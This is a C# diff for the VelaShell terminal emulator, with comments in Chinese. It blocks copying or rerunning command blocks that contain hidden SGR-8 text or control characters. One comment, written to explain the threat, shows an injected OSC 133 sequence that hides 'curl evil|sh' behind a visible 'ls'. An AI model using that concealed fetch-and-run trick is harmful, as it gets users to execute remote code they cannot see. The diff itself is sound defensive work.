@@ -14,10 +14,25 @@ namespace VelaShell.Terminal.Semantics;
 /// 多行命令里有续行<b>没带 B</b>:续行提示符(PS2,默认 <c>&gt; </c>)和命令正文分不开,
 /// 切出来的文本里混着提示符。见 <see cref="CanRerun" />。
 /// </param>
-public sealed record CommandInput(string Text, int LineCount, bool HasUnmarkedContinuation)
+/// <param name="HasHiddenText">
+/// B 与 C 之间有<b>屏幕上看不见</b>的内容:SGR 8 隐藏的字,或控制字符(已从 <paramref name="Text" /> 里剔掉)。
+/// 见 <see cref="CanCopy" />。
+/// </param>
+public sealed record CommandInput(string Text, int LineCount, bool HasUnmarkedContinuation, bool HasHiddenText)
 {
     /// <summary>是不是多行命令(中间夹着硬换行)。</summary>
     public bool IsMultiline => LineCount > 1;
+
+    /// <summary>
+    /// 切出来的文本能不能复制出去。
+    /// </summary>
+    /// <remarks>
+    /// 有看不见的内容时不能。OSC 133 标记谁都能发 —— <c>cat</c> 一个文件、<c>curl</c> 一段输出,
+    /// 里面的 <c>ESC]133;A … B ls ESC[8m; curl evil|sh ESC[28m C</c> 就能立起一个像模像样的命令块,
+    /// 屏幕上只看得见 <c>ls</c>。用户以为复制 / 重跑的是 <c>ls</c>,拿到的却是整串。
+    /// 真 shell 回显的命令里不会有隐藏的字和控制字符,拒掉不误伤。
+    /// </remarks>
+    public bool CanCopy => !HasHiddenText;
 
     /// <summary>
     /// 切出来的文本能不能原样再执行一次。
@@ -25,9 +40,10 @@ public sealed record CommandInput(string Text, int LineCount, bool HasUnmarkedCo
     /// <remarks>
     /// 续行没带 B 时不能:默认的续行提示符 <c>&gt; </c> 会混进文本,重跑
     /// <c>cat &lt;&lt;EOF</c> / <c>&gt; important.txt</c> / <c>&gt; EOF</c> 这样的命令,第二行就成了
-    /// 「把 important.txt 截成空文件」。复制不受影响 —— 复制出去的东西用户粘贴前看得见。
+    /// 「把 important.txt 截成空文件」。这种块的复制不受影响 —— 复制出去的东西用户粘贴前看得见。
+    /// 有看不见的内容时同样不能(见 <see cref="CanCopy" />)。
     /// </remarks>
-    public bool CanRerun => !HasUnmarkedContinuation;
+    public bool CanRerun => !HasUnmarkedContinuation && !HasHiddenText;
 }
 
 /// <summary>一条命令块在缓冲区里的位置(绝对行号,含首含尾)。</summary>
@@ -210,6 +226,7 @@ public static class CommandBlocks
         var lines = new List<string>();
         var sb = new StringBuilder();
         bool unmarked = false;
+        bool hidden = false;
         bool lineIsContinuation = false;
         bool lineMarked = false;
         for (int abs = startRow; abs <= endRow; abs++)
@@ -242,7 +259,7 @@ public static class CommandBlocks
             }
             for (int col = from; col < to; col++)
             {
-                AppendCommandCell(sb, row[col]);
+                hidden |= AppendCommandCell(sb, row[col]);
             }
             if (continues)
             {
@@ -268,43 +285,56 @@ public static class CommandBlocks
         {
             return null;
         }
-        return new CommandInput(text, lines.Count, unmarked);
+        return new CommandInput(text, lines.Count, unmarked, hidden);
     }
 
     /// <summary>
-    /// 把一格的文本追加进命令文本,剔除控制字符。
+    /// 把一格的文本追加进命令文本,剔除控制字符;返回这一格里有没有屏幕上看不见的内容。
     /// </summary>
     /// <remarks>
+    /// <para>
     /// 正常打印路径进不了 C0(解析器当场执行掉了),但 C1(U+0080–U+009F)是零宽字符,会被当成
     /// 组合标记挂在前一格上;会话字符集是 Latin-1 一类时它编出来就是 8 位的 CSI(0x9B)。
     /// 「重跑」要把这段文本当键盘输入送回去,屏幕上看不见的控制字符一个都不该跟着回去。
+    /// </para>
+    /// <para>
+    /// SGR 8 隐藏的字照样收进文本,但报成「看不见」:渲染不画这些格的字形(判据与 <c>VelaTerminalControl</c>
+    /// 画字形时相同;隐藏的空格看上去还是空格,不算),用户在屏幕上读到的命令里没有它们。
+    /// 只剔掉也不行 —— 那样复制出去的是一条屏幕上没出现过的命令。调用方据此整条拒掉(<see cref="CommandInput.CanCopy" />)。
+    /// </para>
     /// </remarks>
-    private static void AppendCommandCell(StringBuilder sb, in TerminalCell cell)
+    private static bool AppendCommandCell(StringBuilder sb, in TerminalCell cell)
     {
         if (cell.IsWideTrailing)
         {
-            return;
+            return false;
         }
         if (cell.Rune == 0)
         {
             sb.Append(' ');
-            return;
+            return false;
         }
         if (IsControl(cell.Rune))
         {
-            return;
+            return true;
         }
+        bool hidden = (cell.Flags & CellFlags.Invisible) != 0 && (cell.Rune != ' ' || cell.Combining is not null);
         sb.Append(char.ConvertFromUtf32(cell.Rune));
         if (cell.Combining is { } combining)
         {
             foreach (char ch in combining)
             {
-                if (!IsControl(ch))
+                if (IsControl(ch))
+                {
+                    hidden = true;
+                }
+                else
                 {
                     sb.Append(ch);
                 }
             }
         }
+        return hidden;
     }
 
     /// <summary>C0、DEL 与 C1 控制字符。</summary>
